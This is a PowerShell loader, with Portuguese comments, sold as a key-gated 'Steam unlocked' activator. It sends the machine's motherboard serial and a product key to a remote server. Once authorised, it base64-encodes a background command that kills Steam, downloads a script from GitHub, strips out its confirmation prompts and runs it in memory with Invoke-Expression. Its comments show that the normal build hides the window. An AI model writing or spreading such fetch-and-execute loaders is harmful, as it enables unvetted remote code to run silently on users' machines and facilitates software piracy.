# 1. MODO DEBUG: Código de ocultação comentado para a janela inicial aparecer
# $showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
# $type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
# $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms

# Captura HWID e Key
$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
$key = [Microsoft.VisualBasic.Interaction]::InputBox("Insira sua chave do produto:", "ATIVAR STEAM DESBLOQUEADA", "")

if (-not $key) { exit }

try {
    $url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
    $body = @{ key = $key; hwid = $hwid } | ConvertTo-Json
    $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"

    if ($auth.status -eq "authorized") {
        
        [System.Windows.Forms.MessageBox]::Show("MODO DEBUG ATIVO.`nUma janela preta do PowerShell ficará aberta mostrando todo o processo.", "Aviso de Debug")

        # Comando de fundo agora feito para ser VISÍVEL
        $bgTask = @"
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        `$logPath = "`$env:TEMP\SteamAtivador_Log.txt"
        Start-Transcript -Path `$logPath -Force
        
        try {
            Write-Host "----------------------------------------" -ForegroundColor Yellow
            Write-Host "INICIANDO DEBUG DA INSTALAÇÃO" -ForegroundColor Yellow
            Write-Host "----------------------------------------" -ForegroundColor Yellow
            
            Write-Host "Fechando Steam para evitar bloqueio de arquivos..." -ForegroundColor Cyan
            Stop-Process -Name steam -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            
            Write-Host "Baixando script original do GitHub..." -ForegroundColor Cyan
            `$s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
            
            Write-Host "Aplicando injeções de memória (Bypass de Confirmação)..." -ForegroundColor Cyan
            `$s = `$s.Replace('[void][System.Console]::ReadKey(`$true)', 'Start-Sleep -Seconds 2')
            `$s = `$s -replace '\`$milleniumTimer\s*=\s*5', '`$milleniumTimer = 0'
            `$s = `$s.Replace('[Console]::KeyAvailable', '`$false')

            Write-Host "Executando script na memória..." -ForegroundColor Green
            Invoke-Expression `$s

            Write-Host "Baixando aviso final..." -ForegroundColor Cyan
            `$wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
            `$path = "`$env:TEMP\warning.txt"
            (New-Object System.Net.WebClient).DownloadFile(`$wUrl, `$path)
            Start-Process notepad.exe `$path
            Write-Host "Processo finalizado com sucesso!" -ForegroundColor Green
            
        } catch {
            Write-Host "ERRO FATAL DURANTE A EXECUÇÃO: `$(`$_.Exception.Message)" -ForegroundColor Red
        } finally {
            Stop-Transcript
            Write-Host "`n----------------------------------------" -ForegroundColor Yellow
            Write-Host "FIM DA EXECUÇÃO. Analise os resultados acima." -ForegroundColor Yellow
            Write-Host "Pressione qualquer tecla para fechar esta janela..." -ForegroundColor White
            
            # PAUSA PARA VOCÊ CONSEGUIR LER O CONSOLE
            `$null = `$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
        }
"@

        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
        
        # MUDANÇA: Substituído '-WindowStyle Hidden' por '-WindowStyle Normal'
        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Normal", "-EncodedCommand", $encoded
        
        exit

    } else {
        [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
}
